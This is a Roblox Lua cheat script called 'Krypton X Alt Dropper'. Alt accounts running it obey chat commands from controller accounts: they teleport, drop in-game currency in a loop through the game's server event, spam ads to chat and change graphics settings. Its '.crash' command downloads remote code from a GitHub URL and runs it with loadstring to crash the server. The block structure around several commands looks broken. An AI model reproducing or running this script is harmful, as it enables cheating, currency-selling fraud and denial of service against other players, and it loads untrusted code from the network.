local player = game.Players.LocalPlayer
local admsg = "Krypton X Alt Dropper. A script made for sellers."
local isamod = false

if table.find(controller,player.UserId) then
    isamod = true
end
local cashaura = false
local cashauraplr = nil
local adtoggle = false
local droptoggle = false
local function cmds(msg,plr)
    if isamod == false or table.find(controller,plr) then
        Mod = game.Players:GetPlayerByUserId(plr)
        isamod = table.find(controller,player.UserId)
        if msg == ".bring" then
            if not isamod then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Mod.Character.HumanoidRootPart.CFrame
            end
        end
        if msg == ".drop" then
            if not isamod then
				droptoggle = true
				local Autoloop
				local autoloopfun = function()
					local amttodrp = 10000
					if player.DataFolder.Currency.Value > 10000 then
						amttodrp = 10000
					else
						amttodrp = player.DataFolder.Currency.Value
					end
					game.ReplicatedStorage.MainEvent:FireServer("DropMoney",amttodrp)
				end;
				local Begin = function()
					Autoloop = game:GetService("RunService").Heartbeat:Connect(autoloopfun);
				end;
				local Stop = function()
					Autoloop:Disconnect()
				end;
				Begin()	
				repeat wait() until droptoggle == false
				Stop()
            end
        end
        if msg == ".stop" then
            if not isamod then
                droptoggle = false
            end
        end
        if msg == ".crash" then
                loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
            end
        end
        if msg == ".ad" then
            if not isamod then
				adtoggle = true
				repeat
					game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(admsg, 'All')
					wait(10)
				until adtoggle == false
            end
        end
        if msg == ".adoff" then
            if not isamod then
                adtoggle = false
            end
        end
        if msg == ".freeze" then
            if not isamod then
                player.Character.HumanoidRootPart.Anchored = true
            end
        end
        if msg == ".unfreeze" then
            if not isamod then
                player.Character.HumanoidRootPart.Anchored = false
            end
        end
        if msg == ".showwal" then
            if not isamod then                
                if game.Players.LocalPlayer.Backpack:FindFirstChild("Wallet") then
                    game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack:FindFirstChild("Wallet"))
                end
            end
        end
        if msg == ".hidewal" then
            if not isamod then
                if game.Players.LocalPlayer.Character:FindFirstChild("Wallet") then
                    game.Players.LocalPlayer.Character.Humanoid:UnequipTools(game.Players.LocalPlayer.Character:FindFirstChild("Wallet"))
                end
            end
        end
        if msg == ".checkcash" then
            if not isamod then
				local amt = 0
				for i,v in pairs(game.Workspace.Ignored.Drop:GetChildren()) do
					if v.Name == "MoneyDrop" then
						local cur = string.split(v.BillboardGui.TextLabel.Text,"$")[2]
						if string.match(cur,',') then
							amt = amt + cur:gsub("%,","")
						else
							amt = amt + cur
						end
						print(string.split(v.BillboardGui.TextLabel.Text,'$')[2])
					end
				end
				function fornum(amt)
					amt = tostring(amt)
					return amt:reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
				end
				game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("$"..fornum(amt), 'All')
            end
        end
        if msg == ".fps1" then
            if not isamod then
                setfpscap(1)
            end
        end
        if msg == ".fps5" then
            if not isamod then
                setfpscap(5)
            end
        end
        if msg == ".fps60" then
            if not isamod then
                setfpscap(60)
            end
        end
        if msg == ".fps999" then
            if not isamod then
                setfpscap(999)
            end
        end
        if msg == ".antilag" then
            if not isamod then
                for i, v in pairs(game.Workspace.Ignored.Drop:GetChildren()) do
                if v.Name == "MoneyDrop" then
                    v:Destroy()
                end
                task.wait()
            end
        end
    end
        if msg == ".lowgfx" then
            if not isamod then
                local decalsyeeted = true
                local g = game
                local w = g.Workspace
                local l = g.Lighting
                local t = w.Terrain
                t.WaterWaveSize = 0
                t.WaterWaveSpeed = 0
                t.WaterReflectance = 0
                t.WaterTransparency = 0
                l.GlobalShadows = false
                l.FogEnd = 9e9
                l.Brightness = 0
                settings().Rendering.QualityLevel = "Level01"
                for i, v in pairs(g:GetDescendants()) do
                    if v:IsA("Part") or v:IsA("Union") or v:IsA("MeshPart") then
                        v.Material = "Plastic"
                        v.Reflectance = 0
                    elseif v:IsA("Decal") and decalsyeeted then
                    v.Transparency = 1
                    elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
                        v.Lifetime = NumberRange.new(0)
                    end
                end
            end
        end
    end

for i,v in pairs(game:GetService('Players'):GetChildren()) do
	if table.find(controller,v.UserId) then
		v.Chatted:Connect(function(msg)
			cmds(msg,v.UserId)
		end)
	end
end

game.Players.PlayerAdded:Connect(function(plr)
	if table.find(controller,plr.UserId) then
		plr.Chatted:Connect(function(msg)
			cmds(msg,plr.UserId)
		end)
	end
end)